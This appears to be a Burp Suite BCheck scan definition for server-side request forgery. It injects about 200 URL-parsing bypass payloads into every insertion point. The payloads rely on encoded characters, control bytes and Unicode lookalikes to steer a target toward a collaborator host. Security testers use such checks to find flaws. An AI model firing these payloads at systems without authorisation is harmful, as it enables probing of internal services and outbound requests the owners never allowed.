metadata:
    language: v1-beta
    name: "SSRF"
    description: "SSRF"
    author: "Uday Datrak"
    tags: "SSRF"

run for each:
    payloads =
`https://\\{generate_collaborator_address()}/`,
`https://example.com &%40{generate_collaborator_address()}# %40{generate_collaborator_address()}/`,
`https://example.com;.{generate_collaborator_address()}/`,
`https://example.com:%40{generate_collaborator_address()}/`,
`https://example.com:443:\%40%40{generate_collaborator_address()}/`,
`https://example.com:443\%40{generate_collaborator_address()}/`,
`https://example.com:443#\%40{generate_collaborator_address()}/`,
`https://example.com:anything%40{generate_collaborator_address()}/`,
`https://example.com?%40{generate_collaborator_address()}/`,
`https://example.com.%5F.{generate_collaborator_address()}/`,
`https://example.com.-.{generate_collaborator_address()}/`,
`https://example.com.%2C.{generate_collaborator_address()}/`,
`https://example.com.;.{generate_collaborator_address()}/`,
`https://example.com.%21.{generate_collaborator_address()}/`,
`https://example.com.%27.{generate_collaborator_address()}/`,
`https://example.com.".{generate_collaborator_address()}/`,
`https://example.com.%28.{generate_collaborator_address()}/`,
`https://example.com.%29.{generate_collaborator_address()}/`,
`https://example.com.\{.{generate_collaborator_address()}/`,
`https://example.com.}.{generate_collaborator_address()}/`,
`https://example.com.*.{generate_collaborator_address()}/`,
`https://example.com.&.{generate_collaborator_address()}/`,
`https://example.com.\`.{generate_collaborator_address()}/`,
`https://example.com.+.{generate_collaborator_address()}/`,
`https://example.com.{generate_collaborator_address()}/`,
`https://example.com.=.{generate_collaborator_address()}/`,
`https://example.com.%7E.{generate_collaborator_address()}/`,
`https://example.com.%24.{generate_collaborator_address()}/`,
`https://example.com%5B%40{generate_collaborator_address()}/`,
`https://example.com%40{generate_collaborator_address()}/`,
`https://example.com\;%40{generate_collaborator_address()}/`,
`https://example.com&anything%40{generate_collaborator_address()}/`,
`https://example.com#{generate_collaborator_address()}/`,
`https://example.com%2523{generate_collaborator_address()}/`,
`https://example.com{generate_collaborator_address()}/`,
`https://{generate_collaborator_address()}%09example.com/`,
`https://{generate_collaborator_address()}%0Aexample.com/`,
`https://{generate_collaborator_address()}%0D%0Aexample.com/`,
`https://{generate_collaborator_address()}%0Dexample.com/`,
`https://{generate_collaborator_address()}%E2%80%A8example.com/`,
`https://{generate_collaborator_address()}%E2%80%A9example.com/`,
`https://{generate_collaborator_address()} %40example.com/`,
`https://{generate_collaborator_address()} &%40example.com/`,
`https://{generate_collaborator_address()} example.com/`,
`https://{generate_collaborator_address()};https://example.com/`,
`https://{generate_collaborator_address()}:\%40%40example.com/`,
`0://{generate_collaborator_address()}:80;http://example.com:80/`,
`https://{generate_collaborator_address()}?example.com/`,
`https://{generate_collaborator_address()}?%00example.com/`,
`https://{generate_collaborator_address()}?=.example.com/`,
`https://{generate_collaborator_address()}?=example.com/`,
`https://{generate_collaborator_address()}?http://example.com/`,
`https://{generate_collaborator_address()}?https://example.com/`,
`https://{generate_collaborator_address()}../`,
`http://{generate_collaborator_address()}.example.com/`,
`https://{generate_collaborator_address()}.example.com/`,
`https://{generate_collaborator_address()}%EF%BC%8Eexample.com/`,
`https://{generate_collaborator_address()}%40%40example.com/`,
`https://{generate_collaborator_address()}%40example.com/`,
`https://{generate_collaborator_address()}/?d=example.com/`,
`https://{generate_collaborator_address()}/.example.com/`,
`https://{generate_collaborator_address()}///example.com/`,
`https://{generate_collaborator_address()}/example.com/`,
`https://{generate_collaborator_address()}\.example.com/`,
`https://{generate_collaborator_address()}\%40%40example.com/`,
`https://{generate_collaborator_address()}\example.com/`,
`https://{generate_collaborator_address()}\anything%40example.com/`,
`https://{generate_collaborator_address()}%EF%BC%86example.com/`,
`https://{generate_collaborator_address()}%EF%B9%A0example.com/`,
`https://{generate_collaborator_address()}#%40example.com/`,
`https://{generate_collaborator_address()}#\%40example.com/`,
`https://{generate_collaborator_address()}#example.com/`,
`https://{generate_collaborator_address()}#%00example.com/`,
`https://{generate_collaborator_address()}%250d%250a%40example.com/`,
`https://{generate_collaborator_address()}%2523%40example.com/`,
`https://{generate_collaborator_address()}%252e%40example.com/`,
`https://{generate_collaborator_address()}%252f%40example.com/`,
`https://{generate_collaborator_address()}%253a443.example.com/`,
`https://{generate_collaborator_address()}%25ffexample.com/`,
`https://{generate_collaborator_address()}+%40example.com/`,
`https://{generate_collaborator_address()}+&%40example.com/`,
`https://{generate_collaborator_address()}%00example.com/`,
`http://anythingexample.com/`,
`https://anythingexample.com/`,
`https://foo%40{generate_collaborator_address()} %40example.com/`,
`https://foo%40{generate_collaborator_address()}:443%40example.com/`,
`http://localhost.{generate_collaborator_address()}/`,
`https://localhost.{generate_collaborator_address()}/`,
`http://sexample.com/`,
`https://%09{generate_collaborator_address()}/`,
`https://%0A{generate_collaborator_address()}/`,
`%0D%0A//{generate_collaborator_address()}`,
`%0D%0A\\{generate_collaborator_address()}`,
`%40{generate_collaborator_address()}`,
`http:%40{generate_collaborator_address()}`,
`https:%40{generate_collaborator_address()}`,
`///{generate_collaborator_address()}`,
`//{generate_collaborator_address()}`,
`/\{generate_collaborator_address()}`,
`/&bsol;/{generate_collaborator_address()}`,
`/&NewLine;/{generate_collaborator_address()}`,
`/&sol;/{generate_collaborator_address()}`,
`/&Tab;/{generate_collaborator_address()}`,
`\%09\{generate_collaborator_address()}`,
`\%0A\{generate_collaborator_address()}`,
`\/{generate_collaborator_address()}`,
`http:\\{generate_collaborator_address()}\`,
'http:{generate_collaborator_address()}`,
`https:{generate_collaborator_address()}`,
`%00http://{generate_collaborator_address()}`,
`%01http://{generate_collaborator_address()}`,
`%02http://{generate_collaborator_address()}`,
`%03http://{generate_collaborator_address()}`,
`%04http://{generate_collaborator_address()}`,
`%05http://{generate_collaborator_address()}`,
`%06http://{generate_collaborator_address()}`,
`%07http://{generate_collaborator_address()}`,
`%08http://{generate_collaborator_address()}`,
`%09http://{generate_collaborator_address()}`,
`%0Ahttp://{generate_collaborator_address()}`,
`%0Bhttp://{generate_collaborator_address()}`,
`%0Chttp://{generate_collaborator_address()}`,
`%0Dhttp://{generate_collaborator_address()}`,
`%0Ehttp://{generate_collaborator_address()}`,
`%0Fhttp://{generate_collaborator_address()}`,
`%10http://{generate_collaborator_address()}`,
`%11http://{generate_collaborator_address()}`,
`%12http://{generate_collaborator_address()}`,
`%13http://{generate_collaborator_address()}`,
`%14http://{generate_collaborator_address()}`,
`%15http://{generate_collaborator_address()}`,
`%16http://{generate_collaborator_address()}`,
`%17http://{generate_collaborator_address()}`,
`%18http://{generate_collaborator_address()}`,
`%19http://{generate_collaborator_address()}`,
`%1Ahttp://{generate_collaborator_address()}`,
`%1Bhttp://{generate_collaborator_address()}`,
`%1Chttp://{generate_collaborator_address()}`,
`%1Dhttp://{generate_collaborator_address()}`,
`%1Ehttp://{generate_collaborator_address()}`,
`%1Fhttp://{generate_collaborator_address()}`,
`http://{generate_collaborator_address()}`,
`h%09ttp://{generate_collaborator_address()}`,
`h%0Attp://{generate_collaborator_address()}`,
`h%0Dttp://{generate_collaborator_address()}`,
`http%09://{generate_collaborator_address()}`,
`http%0A://{generate_collaborator_address()}`,
`http%0D://{generate_collaborator_address()}`,
`%09http%09://{generate_collaborator_address()}`,
`%0Ahttp%0A://{generate_collaborator_address()}`,
`%0Dhttp%0D://{generate_collaborator_address()}`,
`http:/\{generate_collaborator_address()}`,
`http:/\\{generate_collaborator_address()}`,
`http:\\{generate_collaborator_address()}`,
`http:\{generate_collaborator_address()}`,
`http:/{generate_collaborator_address()}`,
`http:/0/{generate_collaborator_address()}`,
`https://%E2%80%8B{generate_collaborator_address()}/`,
`https://%E2%81%A0{generate_collaborator_address()}/`,
`https://%C2%AD{generate_collaborator_address()}/`,
`https://%5B::%25{generate_collaborator_address()}%5D/`,
`https://%5B::%2525{generate_collaborator_address()}%5D/`,
`https://%5Bv1.{generate_collaborator_address()}%5D/`,
`https://{generate_collaborator_address()}%E2%A9%B4example.com/`,
`https://{generate_collaborator_address()}%EF%BC%9Aexample.com/`,
`https://{generate_collaborator_address()}%EF%B9%95example.com/`,
`https://{generate_collaborator_address()}%EF%B8%93example.com/`,
`https://{generate_collaborator_address()}%E2%81%89example.com/`,
`https://{generate_collaborator_address()}%E2%81%88example.com/`,
`https://{generate_collaborator_address()}%E2%81%87example.com/`,
`https://{generate_collaborator_address()}%EF%BC%9Fexample.com/`,
`https://{generate_collaborator_address()}%EF%B9%96example.com/`,
`https://{generate_collaborator_address()}%EF%B8%96example.com/`,
`https://{generate_collaborator_address()}%E2%80%A6example.com/`,
`https://{generate_collaborator_address()}%EF%B8%99example.com/`,
`https://{generate_collaborator_address()}%E2%80%A5example.com/`,
`https://{generate_collaborator_address()}%EF%B8%B0example.com/`,
`https://{generate_collaborator_address()}%E2%80%A4example.com/`,
`https://{generate_collaborator_address()}%EF%B9%92example.com/`,
`https://{generate_collaborator_address()}%EF%BC%A0example.com/`,
`https://{generate_collaborator_address()}%EF%B9%ABexample.com/`,
`https://{generate_collaborator_address()}%EF%BC%8Fexample.com/`,
`https://{generate_collaborator_address()}%EF%BC%BCexample.com/`,
`https://{generate_collaborator_address()}%EF%B9%A8example.com/`,
`https://{generate_collaborator_address()}%EF%BC%83example.com/`,
`https://{generate_collaborator_address()}%EF%B9%9Fexample.com/`,
`https://{generate_collaborator_address()}%E2%92%88example.com/`,
`https://{generate_collaborator_address()}%E2%92%91example.com/`,
`https://{generate_collaborator_address()}%E2%92%92example.com/`,
`https://{generate_collaborator_address()}%E2%92%93example.com/`,
`https://{generate_collaborator_address()}%E2%92%94example.com/`,
`https://{generate_collaborator_address()}%E2%92%95example.com/`,
`https://{generate_collaborator_address()}%E2%92%96example.com/`,
`https://{generate_collaborator_address()}%E2%92%97example.com/`,
`https://{generate_collaborator_address()}%E2%92%98example.com/`,
`https://{generate_collaborator_address()}%E2%92%99example.com/`,
`https://{generate_collaborator_address()}%E2%92%9Aexample.com/`,
`https://{generate_collaborator_address()}%E2%92%89example.com/`,
`https://{generate_collaborator_address()}%E2%92%9Bexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Aexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Bexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Cexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Dexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Eexample.com/`,
`https://{generate_collaborator_address()}%E2%92%8Fexample.com/`,
`https://{generate_collaborator_address()}%E2%92%90example.com/`,
`https://{generate_collaborator_address()}%E3%8F%82example.com/`,
`https://{generate_collaborator_address()}%E2%84%80example.com/`,
`https://{generate_collaborator_address()}%E2%84%81example.com/`,
`https://{generate_collaborator_address()}%E2%84%85example.com/`,
`https://{generate_collaborator_address()}%E2%84%86example.com/`,
`https://{generate_collaborator_address()}%E3%8F%87example.com/`,
`https://{generate_collaborator_address()}%E3%8F%98example.com/`,
`https://{generate_collaborator_address()}%EF%BF%BDexample.com/`


given any insertion point then
     send payload:
        replacing: {payloads}

   if http interactions then
        report issue:
            severity: high
            confidence: tentative
            detail: "SSRF"
    end if
